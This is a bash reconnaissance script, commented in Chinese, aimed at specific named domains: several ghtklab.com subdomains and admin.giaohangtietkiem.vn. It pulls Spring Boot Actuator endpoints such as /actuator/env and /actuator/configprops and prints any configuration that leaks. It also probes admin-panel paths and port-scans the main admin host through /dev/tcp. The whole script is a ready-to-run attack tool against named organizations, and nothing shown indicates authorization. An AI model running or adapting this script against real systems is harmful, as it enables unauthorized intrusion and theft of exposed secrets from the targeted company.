#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 深度挖掘：测试环境弱密码/配置错误"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TEST_TARGETS=(
    "https://chat.ghtklab.com"
    "https://admin.ghtklab.com"
    "https://api.ghtklab.com"
    "https://sos.ghtklab.com"
)

echo "[*] 测试环境(.ghtklab.com)弱密码探测..."

for target in "${TEST_TARGETS[@]}"; do
    echo ""
    echo "━━━ $target ━━━"
    
    # 测试Spring Boot Actuator（测试环境常开放）
    for path in "/actuator/health" "/actuator/env" "/actuator/configprops"; do
        status=$(curl -sk "$target$path" -w "%{http_code}" -o /tmp/actuator_test -m 3 2>/dev/null)
        if [ "$status" == "200" ]; then
            echo "  ✅ $path → 200（配置泄露！）"
            cat /tmp/actuator_test | jq . 2>/dev/null | head -30
        fi
    done
    
    # 测试常见管理后台
    for path in "/admin" "/manager" "/console" "/login"; do
        status=$(curl -sk "$target$path" -w "%{http_code}" -o /dev/null -m 3 2>/dev/null)
        [ "$status" != "404" ] && echo "  ⚠️  $path → $status"
    done
done

echo ""
echo "[*] 测试主域名的开发端口..."
for port in 3000 4000 5000 8000 8080 8081 9000; do
    echo -n "  Port $port → "
    timeout 3 bash -c "echo > /dev/tcp/admin.giaohangtietkiem.vn/$port" 2>/dev/null && echo "开放！" || echo "关闭"
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
